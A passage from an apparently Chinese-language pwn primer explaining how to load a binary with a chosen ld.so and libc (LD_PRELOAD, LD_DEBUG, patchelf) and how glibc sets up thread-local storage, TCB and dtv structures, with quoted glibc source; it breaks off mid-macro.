<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&quot;./lib/ld.so --preload libdl.so.2 ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>: <span class="string">&quot;./lib/&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>系统中另外还有一个环境变量叫做 <code>LD_PRELOAD</code> ，这个文件中我们可以指定预先装载的一些共享库甚或是目标文件。在 <code>LD_PRELOAD</code> 里面指定的文件会在动态链接器按照固定规则搜索共享库之前装载，它比 <code>LD_LIBRARY_PATH</code> 里面所指定的目录中的共享库还要优先。无论程序是否依赖于它们，<code>LD_PRELOAD</code> 里面指定的共享库或目标文件都会被装载。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">process(<span class="string">&quot;./lib/ld.so ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./lib/libc.so.6 ./lib/libdl.so.2&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h3><p>另外还有一个非常有用的环境变量 <code>LD_DEBUG</code> ，这个变量可以打开动态链接器的调试功能，当我们设置这个变量时，动态链接器会在运行时打印出各种有用的信息，对于我们开发和调试共享库有很大的帮助。</p>
<p>例如运行 <code>LD_DEBUG=files /bin/ls</code> 命令时动态链接器打印出了整个装载过程，显示程序依赖于哪个共享库并且按照什么步骤装载和初始化，共享库装载时的地址等。</p>
<ul>
<li><code>bindings</code>：显示动态链接的符号绑定过程。</li>
<li><code>libs</code>：显示共享库的查找过程。</li>
<li><code>versions</code>：显示符号的版本依赖关系。</li>
<li><code>reloc</code>：显示重定位过程。</li>
<li><code>symbols</code>：显示符号表查找过程。</li>
<li><code>statistics</code>：显示动态链接过程中的各种统计信息。</li>
</ul>
<h3 id="patchelf-1"><a href="#patchelf-1" class="headerlink" title="patchelf"></a>patchelf</h3><p>用于对于依赖不是很复杂的程序更换 libc ，有一下几点需要注意：</p>
<ul>
<li>如果在漏洞利用时用到了动态链接相关结构最好不要 patchelf，因为 patchelf 会改变动态链接相关结构的位置。</li>
<li>一个程序在一个版本的虚拟机里面 patchelf 后换到另一个版本虚拟机中可能会运行失败。</li>
<li>在 patch 完 libc 后最好把 ld 也 patch 成大版本相同的 ld ，否则会运行失败。</li>
</ul>
<p>修改 libc：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure></div>
<p>修改 ld：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-2.31.so ./pwn</span><br></pre></td></tr></table></figure></div>
<h1 id="多线程与-TLS"><a href="#多线程与-TLS" class="headerlink" title="多线程与 TLS"></a>多线程与 TLS</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈（如果它知道其他线程的堆栈地址，那么这就是很少见的情况），但实际运用中线程也拥有自己的私有存储空间，包括以下几方面：</p>
<ul>
<li>栈（尽管并非完全无法被其他线程访问，但一般情况下仍然可以认为是私有的数据）。</li>
<li>线程局部存储（Thread Local Storage, TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的容量。</li>
<li>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<p>实际上，线程私有的数据有：</p>
<ul>
<li>局部变量</li>
<li>函数的参数</li>
<li><strong>TLS 数据</strong></li>
</ul>
<p>线程共享的数据有：</p>
<ul>
<li>全局变量</li>
<li>堆上的数据</li>
<li>函数里的静态变量</li>
<li>程序代码，任何线程都有有权利读取并执行任何代码。</li>
<li>打开的文件，A 线程打开的文件可以由 B 线程读写。</li>
</ul>
<p>一个<strong>全局变量</strong>如果使用 <code>__thread</code> 关键字修饰，那么这个变量就变成线程私有的 <strong>TLS 数据</strong>，也就是说每个线程都在自己所属 TLS 中单独保存一份这个变量的副本。例如下面的代码中，<code>a</code> 和 <code>b</code> 都是 TLS 数据，而 <code>c</code> 是全局变量。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -g -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">uint32_t</span> a = <span class="number">0x114514</span>;</span><br><span class="line">__thread <span class="type">uint32_t</span> b;</span><br><span class="line"><span class="type">uint32_t</span> c = <span class="number">0x1919810</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    a = <span class="number">0x12345678</span>;</span><br><span class="line">    b = <span class="number">0x87654321</span>;</span><br><span class="line">    c = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec78f0738) = 12345678, b(0x7f1ec78f073c) = 87654321, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec70ed6f8) = 114514, b(0x7f1ec70ed6fc) = 0, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
<p>分析生成的 ELF 文件的节表，发现多出了 <code>.tdata</code> 和 <code>.tbss</code> ，这两个节分别记录已初始化和未初始化的 TLS 数据。</p>
<p>其中 <code>.tbss</code> 在 ELF 文件中不占用空间， <code>.tdata</code> 在 ELF 中存储了初始化的数据，比如上面的代码中的 <code>__thread uint32_t a = 0x114514</code> 。</p>
<p>ELF 加载到内存中后， <code>.tdata</code> 和 <code>.tbss</code> 这两个节合并为一个段，在程序头表中这个段的 <code>p_type</code> 为 <code>PT_TLS(7)</code> 。</p>
<p>TLS（Thread Local Storage）的结构与 TCB（Thread Control Block）以及 dtv（dynamic thread vector）密切相关，每一个线程中每一个使用了 TLS 功能的模块都拥有一个 TLS Block 。这几者的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005249673.png"
                      alt="image-20241108005249673"
                ></p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>这里是 x86_64-ABI 要求的 TLS 结构，Glibc 实现的 TLS 结构与上图有一些差异。</p>

    </div>
  </div>

<p>根据图中显示的信息，TLS Blocks 可以分为两类：</p>
<ul>
<li>一类是程序装载时就已经存在的（位于 TCB 前），这一部分 Block 被称为 <code>_static TLS_</code> 。</li>
<li>一类是右边的 Blocks 是动态分配的，它们被使用 <code>dlopen</code> 函数在程序运行时动态装载的模块所使用。</li>
</ul>
<p>TCB 作为线程控制块，保存着 <code>dtv</code> 数组的入口，<code>dtv</code> 数组中的每一项都是 TLS Block 的入口，它们是指向 TLS Blocks 的指针。特别的，<code>dtv</code> 数组的第一个成员是一个计数器，每当程序使用 <code>dlopen</code> 函数或者 <code>dlfree</code> 函数加载或者卸载一个具备 TLS 变量的模块，该计数器的值都会加一，从而保证程序内版本的一致性。 特别的，ELF 文件本身对应的 TLS Block 一定在 <code>dtv</code> 数组中占据索引为 1 的位置，且位置上与 TCB 相邻。 还需要注意的是，图中出现了一个名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>p</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">tp_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的指针，在 i386 架构上，这个指针为 gs 段寄存器；在 x86_64 架构上，该指针为 fs 段寄存器。由于该指针与 ELF 文件本身对应的 TLS Block 之间的偏移是固定的，程序在编译时就可以将 ELF 中线程变量的地址硬编码到目标文件中。</p>
<h2 id="主线程-TLS-初始化"><a href="#主线程-TLS-初始化" class="headerlink" title="主线程 TLS 初始化"></a>主线程 TLS 初始化</h2><p>前面提到过在 <code>main</code> 开始前会调用 <code>__libc_setup_tls</code> 初始化 TLS 。</p>
<p>在 <code>__libc_setup_tls</code> 函数中，首先会遍历 ELF 的程序头表，找到 <code>p_type</code> 为 <code>PT_TLS(7)</code> 的段，这个段中就存储着 TLS 的初始化数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Look through the TLS segment if there is any.  */</span></span><br><span class="line"><span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (phdr = _dl_phdr; phdr &lt; &amp;_dl_phdr[_dl_phnum]; ++phdr)</span><br><span class="line">        <span class="keyword">if</span> (phdr-&gt;p_type == PT_TLS) &#123;</span><br><span class="line">            <span class="comment">/* Remember the values we need.  */</span></span><br><span class="line">            memsz = phdr-&gt;p_memsz;</span><br><span class="line">            filesz = phdr-&gt;p_filesz;</span><br><span class="line">            initimage = (<span class="type">void</span> *) phdr-&gt;p_vaddr + main_map-&gt;l_addr;</span><br><span class="line">            align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">if</span> (phdr-&gt;p_align &gt; max_align)</span><br><span class="line">                max_align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后通过 <code>brk</code> 调用为 TLS 中的数据以及一个 <code>pthread</code> 结构体分配内存。其中 <code>pthread</code> 结构体的第一项为 <code>tcbhead_t header;</code> ，即前面提到的 <strong>TCB</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Align the TCB offset to the maximum alignment, as</span></span><br><span class="line"><span class="comment">   _dl_allocate_tls_storage (in elf/dl-tls.c) does using __libc_memalign</span></span><br><span class="line"><span class="comment">   and dl_tls_static_align.  */</span></span><br><span class="line">tcb_offset = roundup (memsz + GLRO(dl_tls_static_surplus), max_align);</span><br><span class="line">tlsblock = __sbrk(tcb_offset + TLS_INIT_TCB_SIZE + max_align);</span><br></pre></td></tr></table></figure></div>
<p><code>tcbhead_t</code> 结构体定义如下，也就是很多资料中提到的 TLS 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">  <span class="type">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_reserved1;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> __glibc_reserved2;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>之后初始化 <code>_dl_static_dtv</code> ，也就是前面提到的 <strong><code>dtv</code> 数组</strong>，具体过程为：</p>
<ul>
<li>将 <code>tlsblock</code> 地址关于 <code>max_align</code> 向上对齐。</li>
<li><code> _dl_static_dtv[0].counter</code> 初始化为 <code>dtv</code> 的数量，由于 <code>_dl_static_dtv</code> 前两项分别用于记录 <code>dtv</code> 总数和使用的数量，因此这里记录的 <code>dtv</code> 数量是要减去这两项的。</li>
<li><code> _dl_static_dtv[1].counter</code> 初始化为 0 。</li>
<li><code>_dl_static_dtv[2]</code> 也就是当前模块对应的 <code>dtv</code> 的 <code>pointer.val</code> 指向 TLS 。</li>
<li><code>_dl_static_dtv[2].pointer.to_free</code> 置为 NULL 。</li>
<li>将 TLS 的初始数据也就是 <code>PT_TLS</code> 段中的数据复制到 TLS 中。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *val;                    <span class="comment">/* Pointer to data, or TLS_DTV_UNALLOCATED.  */</span></span><br><span class="line">  <span class="type">void</span> *to_free;                <span class="comment">/* Unaligned pointer, for deallocation.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for the dtv.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">dtv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> counter;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span> <span class="title">pointer</span>;</span></span><br><span class="line">&#125; <span class="type">dtv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional entries in the slotinfo array of each slotinfo</span></span><br><span class="line"><span class="comment">   list element.  A large number makes it almost certain take we never</span></span><br><span class="line"><span class="comment">   have to iterate beyond the first element in the slotinfo list.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_SLOTINFO_SURPLUS (62)</span></span><br><span class="line"><span class="type">dtv_t</span> _dl_static_dtv[<span class="number">2</span> + TLS_SLOTINFO_SURPLUS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Align the TLS block.  */</span></span><br><span class="line">    tlsblock = (<span class="type">void</span> *) (((<span class="type">uintptr_t</span>) tlsblock + max_align - <span class="number">1</span>)</span><br><span class="line">                         &amp; ~(max_align - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the dtv.  [0] is the length, [1] the generation counter.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">0</span>].counter = (<span class="keyword">sizeof</span>(_dl_static_dtv) / <span class="keyword">sizeof</span>(_dl_static_dtv[<span class="number">0</span>])) - <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// _dl_static_dtv[1].counter = 0;		would be needed if not already done</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the TLS block.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.val = ((<span class="type">char</span> *) tlsblock + tcb_offset</span><br><span class="line">                                     - roundup (memsz, align ?: <span class="number">1</span>));</span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* sbrk gives us zero&#x27;d memory, so we don&#x27;t need to clear the remainder.  */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_dl_static_dtv[<span class="number">2</span>].pointer.val, initimage, filesz);</span><br></pre></td></tr></table></figure></div>
此时 TLS 相关结构之间的关系如下图所示：</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005415665.png"
                      alt="image-20241108005415665"
                ><br>另外还会初始化 <code>link_map</code> 中的 TLS 相关的数据，由此我们可以知道 <code>link_map</code> 中这些字段的含义：</p>
<ul>
<li><code>l_tls_offset </code>：TCB 在 TLS 中的偏移。</li>
<li><code>l_tls_align</code>：TLS 初始数据的对齐，在 TLS 中 TLS 初始数据关于 <code>l_tls_align</code> 向上取整。</li>
<li><code>l_tls_blocksize</code>：TLS 初始数据的大小，也就是前面提到的 TLS Block 的大小。</li>
<li><code>l_tls_initimage</code>：TLS 初始数据的地址。也就是 <code>PT_TLS</code> 段的地址。</li>
<li><code>l_tls_initimage_size</code>：<code>PT_TLS</code> 段在文件中的大小，也就是 <code>.tdata</code> 的大小。</li>
<li><code>l_tls_modid</code>：模块编号。</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">main_map</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">main_map-&gt;l_tls_offset = roundup (memsz, align ?: <span class="number">1</span>);</span><br><span class="line"><span class="comment">/* Update the executable&#x27;s link map with enough information to make</span></span><br><span class="line"><span class="comment">   the TLS routines happy.  */</span></span><br><span class="line">main_map-&gt;l_tls_align = align;</span><br><span class="line">main_map-&gt;l_tls_blocksize = memsz;</span><br><span class="line">main_map-&gt;l_tls_initimage = initimage;</span><br><span class="line">main_map-&gt;l_tls_initimage_size = filesz;</span><br><span class="line">main_map-&gt;l_tls_modid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<h2 id="创建线程时-TLS-初始化"><a href="#创建线程时-TLS-初始化" class="headerlink" title="创建线程时 TLS 初始化"></a>创建线程时 TLS 初始化</h2><p>创建线程的函数 <code>pthread_create</code> 实际调用的是 <code>__pthread_create_2_1</code> 函数，在该函数中调用了 <code>allocate_stack</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> ALLOCATE_STACK(attr, pd) allocate_stack (attr, pd, &amp;stackaddr)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err = ALLOCATE_STACK (iattr, &amp;pd);</span><br></pre></td></tr></table></figure></div>
<p>在 <code>allocate_stack</code> 函数中会调用 <code>mmap</code> 为线程分配栈空间，然后初始化栈底为一个 <code>pthread</code> 结构体并将指针 <code>pd</code> 指向该结构体。最后调用 <code>_dl_allocate_tls</code> 函数为 TCB 创建 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span>;</span></span><br><span class="line">...</span><br><span class="line">  mem = __mmap (<span class="literal">NULL</span>, size, (guardsize == <span class="number">0</span>) ? prot : PROT_NONE,</span><br><span class="line">	MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  ...</span><br><span class="line">  pd = (<span class="keyword">struct</span> pthread *) ((((<span class="type">uintptr_t</span>) mem + size) - TLS_TCB_SIZE) &amp; ~__static_tls_align_m1);</span><br><span class="line">...</span><br><span class="line">_dl_allocate_tls (TLS_TPADJ (pd))</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls </code> 函数依次调用 <code>allocate_dtv</code> 和 <code>_dl_allocate_tls_init</code> 分配和初始化 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">_dl_allocate_tls (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _dl_allocate_tls_init (mem == <span class="literal">NULL</span></span><br><span class="line">				? _dl_allocate_tls_storage ()</span><br><span class="line">				: allocate_dtv (mem));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>allocate_dtv</code> 函数调用了 ptmalloc 堆管理器的 <code>calloc</code> 函数为 <code>dtv</code> 数组分配内存，初始化 <code>dtv[0].counter</code> 为数组中元素数量，并且让 <code>pd-&gt;dtv</code> 指向 <code>dtv[1]</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Install the dtv pointer.  The pointer passed is to the element with</span></span><br><span class="line"><span class="comment">   index -1 which contain the length.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INSTALL_DTV(descr, dtvp) \</span></span><br><span class="line"><span class="meta">  ((tcbhead_t *) (descr))-&gt;dtv = (dtvp) + 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">allocate_dtv</span> <span class="params">(<span class="type">void</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">size_t</span> dtv_length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We allocate a few more elements in the dtv than are needed for the</span></span><br><span class="line"><span class="comment">     initial set of modules.  This should avoid in most cases expansions</span></span><br><span class="line"><span class="comment">     of the dtv.  */</span></span><br><span class="line">  dtv_length = GL(dl_tls_max_dtv_idx) + DTV_SURPLUS;</span><br><span class="line">  dtv = <span class="built_in">calloc</span> (dtv_length + <span class="number">2</span>, <span class="keyword">sizeof</span> (<span class="type">dtv_t</span>));</span><br><span class="line">  <span class="keyword">if</span> (dtv != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the initial length of the dtv.  */</span></span><br><span class="line">      dtv[<span class="number">0</span>].counter = dtv_length;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The rest of the dtv (including the generation counter) is</span></span><br><span class="line"><span class="comment">	 Initialize with zero to indicate nothing there.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Add the dtv to the thread data structures.  */</span></span><br><span class="line">      INSTALL_DTV (result, dtv);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls_init</code> 函数会遍历 <code>dl_tls_dtv_slotinfo_list</code> 中的 <code>link_map</code> ，初始化 <code>dtv</code> 数组并将初始数据复制到 TLS 变量中。<strong>从这里可以看出，如果一个模块有 TLS 变量，则该模块对应的 <code>dtv-&gt;pointer.val</code> 指向 TLS 变量的起始地址。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = TLS_DTV_UNALLOCATED;</span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_tls_offset == NO_TLS_OFFSET</span><br><span class="line">    || <span class="built_in">map</span>-&gt;l_tls_offset == FORCED_DYNAMIC_TLS_OFFSET)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Set up the DTV entry.  The simplified __tls_get_addr that</span></span><br><span class="line"><span class="comment">   some platforms use in static programs requires it.  */</span></span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = dest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy the initialization image and clear the BSS part.  */</span></span><br><span class="line"><span class="built_in">memset</span>(__mempcpy (dest, <span class="built_in">map</span>-&gt;l_tls_initimage,</span><br><span class="line">                  <span class="built_in">map</span>-&gt;l_tls_initimage_size), <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">       <span class="built_in">map</span>-&gt;l_tls_blocksize - <span class="built_in">map</span>-&gt;l_tls_initimage_size);</span><br></pre></td></tr></table></figure></div>
<p>回到 <code>__pthread_create_2_1</code> 函数，在完成了 <code>pthread</code> 的一系列初始化后调用了 <code>THREAD_COPY_STACK_GUARD</code> 和 <code>THREAD_COPY_POINTER_GUARD</code> 两个宏，这两个宏的展开如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">((pd)-&gt;header.stack_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.stack_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.stack_guard))))); 